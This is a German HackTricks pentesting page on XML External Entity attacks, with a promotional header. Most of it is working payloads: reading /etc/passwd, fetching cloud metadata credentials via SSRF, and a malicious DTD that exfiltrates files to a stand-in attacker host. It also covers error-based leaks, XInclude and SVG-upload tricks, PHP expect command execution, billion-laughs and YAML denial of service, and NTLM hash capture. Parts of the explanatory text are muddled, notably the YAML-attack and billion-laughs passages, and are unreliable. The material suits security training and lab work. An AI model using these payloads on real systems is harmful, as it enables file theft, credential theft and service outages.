# XXE - XEE - XML External Entity

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>


## XML-Grundlagen

XML ist eine Auszeichnungssprache, die f√ºr die Speicherung und den Transport von Daten entwickelt wurde. Sie zeichnet sich durch eine flexible Struktur aus, die die Verwendung von beschreibend benannten Tags erm√∂glicht. Im Gegensatz zu HTML ist XML nicht auf eine Reihe vordefinierter Tags beschr√§nkt. Die Bedeutung von XML hat mit dem Aufstieg von JSON abgenommen, obwohl es urspr√ºnglich eine Rolle in der AJAX-Technologie spielte.

- **Datenrepr√§sentation durch Entit√§ten**: Entit√§ten in XML erm√∂glichen die Darstellung von Daten, einschlie√ülich Sonderzeichen wie `&lt;` und `&gt;`, die `<` und `>` entsprechen, um Konflikte mit dem Tag-System von XML zu vermeiden.

- **Definition von XML-Elementen**: XML erm√∂glicht die Definition von Elementtypen, die festlegen, wie Elemente strukturiert sein sollten und welchen Inhalt sie enthalten k√∂nnen, von beliebigem Inhalt bis hin zu spezifischen Unterelementen.

- **Document Type Definition (DTD)**: DTDs sind in XML entscheidend, um die Struktur des Dokuments und die Arten von Daten, die es enthalten kann, zu definieren. Sie k√∂nnen intern, extern oder in Kombination sein und bestimmen, wie Dokumente formatiert und validiert werden.

- **Benutzerdefinierte und externe Entit√§ten**: XML unterst√ºtzt die Erstellung benutzerdefinierter Entit√§ten innerhalb einer DTD zur flexiblen Datenrepr√§sentation. Externe Entit√§ten, die mit einer URL definiert sind, werfen Sicherheitsbedenken auf, insbesondere im Zusammenhang mit XML External Entity (XXE)-Angriffen, die die Art und Weise ausnutzen, wie XML-Parser externe Datenquellen verarbeiten: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **XXE-Erkennung mit Parameterentit√§ten**: Zur Erkennung von XXE-Schwachstellen, insbesondere wenn herk√∂mmliche Methoden aufgrund von Sicherheitsma√ünahmen des Parsers fehlschlagen, k√∂nnen XML-Parameterentit√§ten verwendet werden. Diese Entit√§ten erm√∂glichen Out-of-Band-Erkennungstechniken wie das Ausl√∂sen von DNS-Lookups oder HTTP-Anfragen an eine kontrollierte Dom√§ne, um die Schwachstelle zu best√§tigen.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Hauptangriffe

**[Die meisten dieser Angriffe wurden mit den gro√üartigen Portswiggers XEE-Labs getestet: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Neuer Entit√§ts-Test

Bei diesem Angriff werde ich testen, ob eine einfache neue ENTITY-Deklaration funktioniert
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Datei lesen

Versuchen wir, die Datei `/etc/passwd` auf verschiedene Arten zu lesen. F√ºr Windows k√∂nntest du versuchen, folgendes zu lesen: `C:\windows\system32\drivers\etc\hosts`

In diesem ersten Fall beachte, dass SYSTEM "_\*\*file:///\*\*etc/passwd_" ebenfalls funktioniert.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Dieser zweite Fall kann n√ºtzlich sein, um eine Datei zu extrahieren, wenn der Webserver PHP verwendet (nicht der Fall bei Portswiggers Labs).
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Im dritten Fall beachten wir, dass wir das Element `stockCheck` als ANY deklarieren.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Verzeichnis auflisten

In Java-basierten Anwendungen ist es m√∂glicherweise m√∂glich, den Inhalt eines Verzeichnisses √ºber XXE aufzulisten, indem man eine Payload wie folgt verwendet (nur nach dem Verzeichnis fragen anstelle der Datei):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Ein XXE kann verwendet werden, um eine SSRF in einer Cloud zu missbrauchen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

Mit der zuvor kommentierten Technik k√∂nnen Sie den Server dazu bringen, auf einen von Ihnen kontrollierten Server zuzugreifen, um seine Verwundbarkeit aufzuzeigen. Wenn dies jedoch nicht funktioniert, liegt es m√∂glicherweise daran, dass XML-Entit√§ten nicht erlaubt sind. In diesem Fall k√∂nnten Sie versuchen, XML-Parameterentit√§ten zu verwenden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Daten au√üerhalb des Bandes exfiltrieren

**In diesem Fall werden wir den Server dazu bringen, eine neue DTD mit einer b√∂sartigen Nutzlast zu laden, die den Inhalt einer Datei √ºber einen HTTP-Request sendet (f√ºr mehrzeilige Dateien k√∂nnten Sie versuchen, sie √ºber** _**ftp://**_** zu exfiltrieren). Diese Erkl√§rung basiert auf dem** [**Portswiggers Lab hier**](https://portswigger.net/web-security/xxe/blind)**.**

In der gegebenen b√∂sartigen DTD werden eine Reihe von Schritten durchgef√ºhrt, um Daten zu exfiltrieren:

### Beispiel f√ºr eine b√∂sartige DTD:
Die Struktur ist wie folgt:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Die von dieser DTD ausgef√ºhrten Schritte umfassen:

1. **Definition von Parameter-Entit√§ten:**
- Eine XML-Parameter-Entit√§t `%file` wird erstellt, die den Inhalt der Datei `/etc/hostname` liest.
- Eine weitere XML-Parameter-Entit√§t `%eval` wird definiert. Sie deklariert dynamisch eine neue XML-Parameter-Entit√§t `%exfiltrate`. Die `%exfiltrate`-Entit√§t wird so eingestellt, dass sie eine HTTP-Anfrage an den Server des Angreifers sendet und den Inhalt der `%file`-Entit√§t im Query-String der URL √ºbergibt.

2. **Ausf√ºhrung der Entit√§ten:**
- Die `%eval`-Entit√§t wird verwendet, was zur Ausf√ºhrung der dynamischen Deklaration der `%exfiltrate`-Entit√§t f√ºhrt.
- Die `%exfiltrate`-Entit√§t wird dann verwendet, um eine HTTP-Anfrage an die angegebene URL mit dem Inhalt der Datei auszul√∂sen.

Der Angreifer hostet diese b√∂sartige DTD auf einem Server unter seiner Kontrolle, normalerweise unter einer URL wie `http://web-attacker.com/malicious.dtd`.

**XXE-Payload:**
Um eine verwundbare Anwendung auszunutzen, sendet der Angreifer ein XXE-Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Dieses Payload definiert eine XML-Parameter-Entity `%xxe` und bindet sie in die DTD ein. Wenn dieser Payload von einem XML-Parser verarbeitet wird, ruft er die externe DTD vom Server des Angreifers ab. Der Parser interpretiert dann die DTD inline und f√ºhrt die in der b√∂sartigen DTD beschriebenen Schritte aus, was zur Exfiltration der Datei `/etc/hostname` auf den Server des Angreifers f√ºhrt.


### Fehlerbasiert (Externe DTD)

**In diesem Fall laden wir eine b√∂sartige DTD auf den Server, die den Inhalt einer Datei in einer Fehlermeldung anzeigt (dies ist nur g√ºltig, wenn Fehlermeldungen angezeigt werden k√∂nnen).** [**Beispiel von hier.**](https://portswigger.net/web-security/xxe/blind)

Eine XML-Analysefehlermeldung, die den Inhalt der Datei `/etc/passwd` offenbart, kann mithilfe einer b√∂sartigen externen Document Type Definition (DTD) ausgel√∂st werden. Dies wird durch die folgenden Schritte erreicht:

1. Eine XML-Parameter-Entity namens `file` wird definiert, die den Inhalt der Datei `/etc/passwd` enth√§lt.
2. Eine XML-Parameter-Entity namens `eval` wird definiert, die eine dynamische Deklaration f√ºr eine andere XML-Parameter-Entity namens `error` enth√§lt. Diese `error`-Entity versucht beim Auswerten, eine nicht vorhandene Datei zu laden, wobei sie den Inhalt der `file`-Entity als Dateinamen verwendet.
3. Die `eval`-Entity wird aufgerufen, was zur dynamischen Deklaration der `error`-Entity f√ºhrt.
4. Der Aufruf der `error`-Entity f√ºhrt zu einem Versuch, eine nicht vorhandene Datei zu laden, was eine Fehlermeldung erzeugt, die den Inhalt der Datei `/etc/passwd` als Teil des Dateinamens enth√§lt.

Die b√∂sartige externe DTD kann mit dem folgenden XML aufgerufen werden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bei der Ausf√ºhrung sollte die Antwort des Webservers eine Fehlermeldung enthalten, die den Inhalt der Datei `/etc/passwd` anzeigt.


![](<../.gitbook/assets/image (223) (1).png>)

_**Bitte beachten Sie, dass externe DTD es uns erm√∂glichen, eine Entit√§t in die zweite (****`eval`****) einzuschlie√üen, dies jedoch in der internen DTD verboten ist. Daher k√∂nnen Sie normalerweise keinen Fehler erzwingen, ohne eine externe DTD zu verwenden.**_

### **Fehlerbasiert (system DTD)**

Was ist mit blinden XXE-Schwachstellen, wenn **Out-of-Band-Interaktionen blockiert sind** (externe Verbindungen nicht verf√ºgbar sind)?.

Eine L√ºcke in der XML-Sprachspezifikation kann **sensible Daten √ºber Fehlermeldungen offenlegen, wenn die DTD eines Dokuments interne und externe Deklarationen kombiniert**. Dieses Problem erm√∂glicht die interne Neudefinition von extern deklarierten Entit√§ten und erleichtert die Ausf√ºhrung von fehlerbasierten XXE-Angriffen. Solche Angriffe nutzen die Neudefinition einer XML-Parameterentit√§t, die urspr√ºnglich in einer externen DTD deklariert wurde, innerhalb einer internen DTD. Wenn Out-of-Band-Verbindungen vom Server blockiert werden, m√ºssen Angreifer auf lokale DTD-Dateien zur√ºckgreifen, um den Angriff durchzuf√ºhren und einen Parsing-Fehler zu verursachen, um sensible Informationen offenzulegen.


Betrachten Sie ein Szenario, in dem sich auf dem Dateisystem des Servers eine DTD-Datei unter `/usr/local/app/schema.dtd` befindet, die eine Entit√§t mit dem Namen `custom_entity` definiert. Ein Angreifer kann einen XML-Parsing-Fehler verursachen, der den Inhalt der Datei `/etc/passwd` offenbart, indem er eine hybride DTD wie folgt √ºbermittelt:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Die folgenden Schritte werden von dieser DTD ausgef√ºhrt:

- Die Definition einer XML-Parameterentit√§t mit dem Namen `local_dtd` enth√§lt die externe DTD-Datei, die sich auf dem Dateisystem des Servers befindet.
- Eine Neudefinition der XML-Parameterentit√§t `custom_entity`, die urspr√ºnglich in der externen DTD definiert wurde, erfolgt, um einen [fehlerbasierten XXE-Exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) zu umschlie√üen. Diese Neudefinition ist darauf ausgelegt, einen Parsing-Fehler hervorzurufen und den Inhalt der Datei `/etc/passwd` offenzulegen.
- Durch Verwendung der Entit√§t `local_dtd` wird die externe DTD aktiviert, die die neu definierte `custom_entity` umfasst. Diese Abfolge von Aktionen f√ºhrt zur Ausgabe der vom Exploit angestrebten Fehlermeldung.

**Praxisbeispiel:** Systeme, die die GNOME-Desktop-Umgebung verwenden, haben oft eine DTD-Datei unter `/usr/share/yelp/dtd/docbookx.dtd`, die eine Entit√§t namens `ISOamso` enth√§lt.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Da diese Technik eine **interne DTD verwendet, m√ºssen Sie zuerst eine g√ºltige finden**. Sie k√∂nnten dies tun, indem Sie das gleiche **Betriebssystem / Software** installieren, das der Server verwendet, und nach einigen Standard-DTDs suchen, oder Sie k√∂nnten eine Liste von Standard-DTDs in Systemen abrufen und √ºberpr√ºfen, ob eine davon existiert:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
F√ºr weitere Informationen siehe [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Auffinden von DTDs im System

In dem folgenden gro√üartigen Github-Repo finden Sie **Pfade von DTDs, die im System vorhanden sein k√∂nnen**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Dar√ºber hinaus k√∂nnen Sie, wenn Sie das **Docker-Image des Opfersystems** haben, das Tool des gleichen Repos verwenden, um das **Image zu scannen** und den Pfad der im System vorhandenen **DTDs zu finden**. Lesen Sie das [Readme des Githubs](https://github.com/GoSecure/dtd-finder), um zu erfahren, wie.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE √ºber Office Open XML-Parser

F√ºr eine ausf√ºhrlichere Erkl√§rung dieses Angriffs **schauen Sie sich den zweiten Abschnitt dieses erstaunlichen Beitrags von Detectify an**.

Viele Webanwendungen bieten die M√∂glichkeit, **Microsoft Office-Dokumente hochzuladen**, die dann bestimmte Details aus diesen Dokumenten extrahieren. Zum Beispiel kann eine Webanwendung Benutzern erm√∂glichen, Daten durch Hochladen einer XLSX-Format-Tabelle zu importieren. Damit der Parser die Daten aus der Tabelle extrahieren kann, muss er zwangsl√§ufig mindestens eine XML-Datei analysieren.

Um diese Schwachstelle zu testen, ist es erforderlich, eine **Microsoft Office-Datei mit einer XXE-Payload zu erstellen**. Der erste Schritt besteht darin, ein leeres Verzeichnis zu erstellen, in das das Dokument entpackt werden kann.

Sobald das Dokument entpackt wurde, sollte die XML-Datei unter `./unzipped/word/document.xml` in einem bevorzugten Texteditor (wie vim) ge√∂ffnet und bearbeitet werden. Die XML sollte so ge√§ndert werden, dass die gew√ºnschte XXE-Payload enthalten ist, oft beginnend mit einer HTTP-Anfrage.

Die modifizierten XML-Zeilen sollten zwischen den beiden Wurzel-XML-Objekten eingef√ºgt werden. Es ist wichtig, die URL durch eine √ºberwachbare URL f√ºr Anfragen zu ersetzen.

Schlie√ülich kann die Datei gezippt werden, um die b√∂sartige poc.docx-Datei zu erstellen. Aus dem zuvor erstellten "unzipped"-Verzeichnis sollte der folgende Befehl ausgef√ºhrt werden:

Nun kann die erstellte Datei in die potenziell gef√§hrdete Webanwendung hochgeladen werden, und man kann auf eine Anfrage in den Burp Collaborator-Protokollen hoffen.


### Jar: Protokoll

Das **jar**-Protokoll ist ausschlie√ülich in **Java-Anwendungen** zug√§nglich. Es wurde entwickelt, um den Dateizugriff innerhalb eines **PKZIP**-Archivs (z. B. `.zip`, `.jar`, usw.) zu erm√∂glichen und sowohl lokale als auch entfernte Dateien zu unterst√ºtzen.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Um auf Dateien innerhalb von PKZIP-Archiven zugreifen zu k√∂nnen, ist es **sehr n√ºtzlich, XXE √ºber System DTD-Dateien auszunutzen**. √úberpr√ºfen Sie [diesen Abschnitt, um zu erfahren, wie man System DTD-Dateien ausnutzt](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Der Prozess, um √ºber das jar-Protokoll auf eine Datei innerhalb eines PKZIP-Archivs zuzugreifen, umfasst mehrere Schritte:

1. Es wird eine HTTP-Anfrage gestellt, um das Zip-Archiv von einem bestimmten Speicherort herunterzuladen, wie z.B. `https://download.website.com/archive.zip`.
2. Die HTTP-Antwort, die das Archiv enth√§lt, wird vor√ºbergehend auf dem System gespeichert, normalerweise an einem Ort wie `/tmp/...`.
3. Das Archiv wird dann extrahiert, um auf dessen Inhalte zugreifen zu k√∂nnen.
4. Die spezifische Datei innerhalb des Archivs, `file.zip`, wird gelesen.
5. Nach der Operation werden alle tempor√§ren Dateien, die w√§hrend dieses Prozesses erstellt wurden, gel√∂scht.

Eine interessante Technik, um diesen Prozess im zweiten Schritt zu unterbrechen, besteht darin, die Serververbindung unbegrenzt offen zu halten, w√§hrend die Archivdatei bereitgestellt wird. Tools, die in [diesem Repository](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) verf√ºgbar sind, k√∂nnen zu diesem Zweck verwendet werden, einschlie√ülich eines Python-Servers (`slow_http_server.py`) und eines Java-Servers (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Das Schreiben von Dateien in einem tempor√§ren Verzeichnis kann dazu beitragen, eine andere Schwachstelle zu eskalieren, die einen Pfad-Traversal beinhaltet (wie z.B. lokale Dateieinbindung, Template-Injection, XSLT RCE, Deserialisierung, etc.).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
Eine Billion-Lach-Attacke ist eine Art von Denial-of-Service-Angriff (DoS-Angriff), der auf XML External Entity (XXE) basiert. Bei diesem Angriff wird ein speziell gestaltetes XML-Dokument verwendet, das eine gro√üe Anzahl von Entity-Verweisen enth√§lt. Jeder dieser Verweise verweist auf eine andere Entity, die wiederum auf eine andere Entity verweist und so weiter. Dies f√ºhrt zu einer exponentiellen Zunahme der Anzahl von Entity-Verweisen und kann dazu f√ºhren, dass das System √ºberlastet wird und nicht mehr reagiert.

Der Name "Billion Laugh Attack" kommt von der Tatsache, dass das XML-Dokument eine Billion (10^12) Entity-Verweise enth√§lt. Wenn das System versucht, das Dokument zu verarbeiten, wird es in einer endlosen Schleife gefangen und verbraucht eine gro√üe Menge an CPU-Ressourcen. Dies kann dazu f√ºhren, dass das System abst√ºrzt oder nicht mehr reagiert.

Diese Art von Angriff kann dazu verwendet werden, einen DoS-Angriff auf eine Anwendung oder einen Webdienst durchzuf√ºhren, der XML-Verarbeitung unterst√ºtzt. Es ist wichtig zu beachten, dass nicht alle Anwendungen anf√§llig f√ºr eine Billion-Lach-Attacke sind. Die Verwundbarkeit tritt auf, wenn die Anwendung nicht ordnungsgem√§√ü mit externen Entit√§ten umgeht und es einem Angreifer erm√∂glicht, sch√§dlichen Code einzuf√ºgen und auszuf√ºhren.

Um sich vor einer Billion-Lach-Attacke zu sch√ºtzen, sollten Entwickler sicherstellen, dass ihre Anwendungen sicher mit externen Entit√§ten umgehen. Dies kann durch das Deaktivieren der externen Entit√§ten oder das Implementieren von Whitelists f√ºr erlaubte Entit√§ten erreicht werden. Es ist auch wichtig, regelm√§√üig Sicherheitsupdates f√ºr die verwendeten XML-Parser und -Bibliotheken durchzuf√ºhren, da diese oft Patches enthalten, um solche Angriffe zu verhindern.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml-Angriff

YAML (YAML Ain't Markup Language) ist eine einfache, menschenlesbare Datenstruktur, die h√§ufig zum Speichern und √úbertragen von Konfigurationsdaten verwendet wird. YAML-Dateien k√∂nnen jedoch auch anf√§llig f√ºr Angriffe sein, insbesondere f√ºr sogenannte Yaml-Angriffe.

Ein Yaml-Angriff tritt auf, wenn ein Angreifer eine b√∂sartige YAML-Datei erstellt, die eine Schwachstelle im Verarbeitungsmechanismus ausnutzt. Dies kann zu verschiedenen Sicherheitsproblemen f√ºhren, wie z.B. der Offenlegung sensibler Informationen oder der Ausf√ºhrung von Remote-Code.

Um einen Yaml-Angriff durchzuf√ºhren, muss der Angreifer eine speziell gestaltete YAML-Datei erstellen, die eine externe Entit√§t enth√§lt. Eine externe Entit√§t ist ein Verweis auf eine externe Ressource, wie z.B. eine Datei oder eine URL. Wenn die YAML-Datei verarbeitet wird, wird die externe Entit√§t aufgel√∂st und kann dazu f√ºhren, dass vertrauliche Informationen preisgegeben werden oder dass b√∂sartiger Code ausgef√ºhrt wird.

Es gibt verschiedene Techniken, um einen Yaml-Angriff durchzuf√ºhren, darunter:

- XML External Entity (XXE) Injection: Diese Technik nutzt die F√§higkeit von YAML, XML-Daten zu verarbeiten, um externe Entit√§ten einzuf√ºgen und auszuf√ºhren.
- Remote Code Execution (RCE): Durch die Ausf√ºhrung von b√∂sartigem Code kann ein Angreifer die Kontrolle √ºber das System √ºbernehmen und verschiedene Aktionen ausf√ºhren.

Um sich vor Yaml-Angriffen zu sch√ºtzen, sollten Entwickler und Systemadministratoren sicherstellen, dass die YAML-Verarbeitung ordnungsgem√§√ü abgesichert ist. Dies kann durch das Deaktivieren der Verarbeitung externer Entit√§ten, das Validieren und Filtern von Benutzereingaben sowie das Aktualisieren auf die neuesten Versionen der verwendeten YAML-Bibliotheken erreicht werden.

Es ist auch wichtig, regelm√§√üig Sicherheitsupdates durchzuf√ºhren und bew√§hrte Sicherheitspraktiken zu befolgen, um das Risiko von Yaml-Angriffen zu minimieren.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratische Aufbl√§hungsattacke

![](<../.gitbook/assets/image (531).png>)

#### NTML erhalten

Auf Windows-Hosts ist es m√∂glich, den NTML-Hash des Webserver-Benutzers zu erhalten, indem ein responder.py-Handler festgelegt wird:
```bash
Responder.py -I eth0 -v
```
und indem Sie die folgende Anfrage senden
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Dann k√∂nnen Sie versuchen, den Hash mit Hashcat zu knacken.

## Versteckte XXE-Oberfl√§chen

### XInclude

Bei der Integration von Client-Daten in serverseitige XML-Dokumente, wie sie in Backend-SOAP-Anfragen verwendet werden, ist die direkte Kontrolle √ºber die XML-Struktur h√§ufig eingeschr√§nkt, was herk√∂mmliche XXE-Angriffe aufgrund von Einschr√§nkungen bei der √Ñnderung des `DOCTYPE`-Elements behindert. Ein `XInclude`-Angriff bietet jedoch eine L√∂sung, indem er das Einf√ºgen externer Entit√§ten in jedes Datenelement des XML-Dokuments erm√∂glicht. Diese Methode ist auch dann wirksam, wenn nur ein Teil der Daten innerhalb eines servergenerierten XML-Dokuments kontrolliert werden kann.

Um einen `XInclude`-Angriff auszuf√ºhren, muss der `XInclude`-Namespace deklariert und der Dateipfad f√ºr die beabsichtigte externe Entit√§t angegeben werden. Im Folgenden finden Sie ein pr√§gnantes Beispiel, wie ein solcher Angriff formuliert werden kann:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
√úberpr√ºfen Sie [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) f√ºr weitere Informationen!

### SVG - Datei-Upload

Von Benutzern hochgeladene Dateien, die dann auf dem Server verarbeitet werden, k√∂nnen Schwachstellen in der Handhabung von XML- oder XML-Dateiformaten ausnutzen. G√§ngige Dateiformate wie Office-Dokumente (DOCX) und Bilder (SVG) basieren auf XML.

Wenn Benutzer **Bilder hochladen**, werden diese Bilder serverseitig verarbeitet oder validiert. Selbst f√ºr Anwendungen, die Formate wie PNG oder JPEG erwarten, **k√∂nnte die Bildverarbeitungsbibliothek des Servers auch SVG-Bilder unterst√ºtzen**. SVG, als XML-basiertes Format, kann von Angreifern ausgenutzt werden, um b√∂sartige SVG-Bilder zu √ºbermitteln und dadurch den Server an XXE (XML External Entity)-Schwachstellen zu exponieren.

Ein Beispiel f√ºr einen solchen Angriff wird unten gezeigt, bei dem ein b√∂sartiges SVG-Bild versucht, Systemdateien zu lesen:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Eine andere Methode besteht darin, versuchen, Befehle √ºber den PHP-"expect"-Wrapper auszuf√ºhren:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
In beiden F√§llen wird das SVG-Format verwendet, um Angriffe zu starten, die die XML-Verarbeitungsf√§higkeiten der Server-Software ausnutzen. Dies unterstreicht die Notwendigkeit einer robusten Eingabevalidierung und Sicherheitsma√ünahmen.

Weitere Informationen finden Sie unter [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)!

**Beachten Sie, dass die erste Zeile der gelesenen Datei oder des Ergebnisses der Ausf√ºhrung INNERHALB des erstellten Bildes angezeigt wird. Sie m√ºssen also in der Lage sein, auf das von SVG erstellte Bild zuzugreifen.**

### **PDF - Datei-Upload**

Lesen Sie den folgenden Beitrag, um zu erfahren, wie Sie eine XXE ausnutzen k√∂nnen, indem Sie eine PDF-Datei hochladen:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Von x-www-urlencoded zu XML

Wenn eine POST-Anfrage die Daten im XML-Format akzeptiert, k√∂nnen Sie versuchen, eine XXE in dieser Anfrage auszunutzen. Zum Beispiel enth√§lt eine normale Anfrage folgendes:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Dann k√∂nnten Sie m√∂glicherweise die folgende Anfrage senden, mit demselben Ergebnis:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
